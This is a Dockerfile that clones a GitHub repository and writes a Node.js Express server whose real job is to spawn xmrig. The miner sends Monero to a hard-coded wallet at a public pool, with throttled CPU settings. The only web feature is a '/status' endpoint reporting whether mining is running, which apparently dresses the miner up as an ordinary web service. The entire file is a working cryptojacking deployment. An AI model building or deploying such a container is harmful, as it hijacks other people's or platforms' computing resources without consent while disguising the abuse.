# Use the official Ubuntu image as a base
FROM ubuntu:latest

# Install necessary packages
RUN apt-get update && apt-get install -y \
    git \
    wget \
    build-essential \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    nodejs \
    npm \
    curl

# Clone the specified GitHub repository
RUN git clone https://github.com/WackyDawg/effective-fortnight.git

# Change directory to the cloned repository
WORKDIR /effective-fortnight

# Install Node.js and Express
RUN npm install express

# Create the server.js file
RUN echo "const express = require('express');\n\
const { spawn } = require('child_process');\n\
const app = express();\n\
const port = 6980;\n\
\n\
let xmrigProcess;\n\
\n\
function startXmrig() {\n\
    if (!xmrigProcess) {\n\
        xmrigProcess = spawn('./xmrig', ['--url', 'gulf.moneroocean.stream:10128', '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc', '--pass', 'x', '--cpu-priority', '1', '--threads', '1', '--donate-level', '1', '--av', '0', '--cpu-max-threads-hint', '2']);\n\
        xmrigProcess.stdout.on('data', (data) => {\n\
            console.log(`xmrig stdout: ${data}`);\n\
        });\n\
        xmrigProcess.stderr.on('data', (data) => {\n\
            console.error(`xmrig stderr: ${data}`);\n\
        });\n\
        xmrigProcess.on('close', (code) => {\n\
            console.log(`xmrig process exited with code ${code}`);\n\
        });\n\
        console.log('xmrig started');\n\
    } else {\n\
        console.log('xmrig already running');\n\
    }\n\
}\n\
\n\
startXmrig();\n\
\n\
app.get('/status', (req, res) => {\n\
    const status = xmrigProcess ? 'running' : 'stopped';\n\
    res.send(`xmrig is currently ${status}`);\n\
});\n\
\n\
app.listen(port, () => {\n\
    console.log(`Express server running on http://localhost:${port}`);\n\
});" > server.js

# Expose the port the server will run on
EXPOSE 6980

# Run the Express server
CMD ["node", "server.js"]
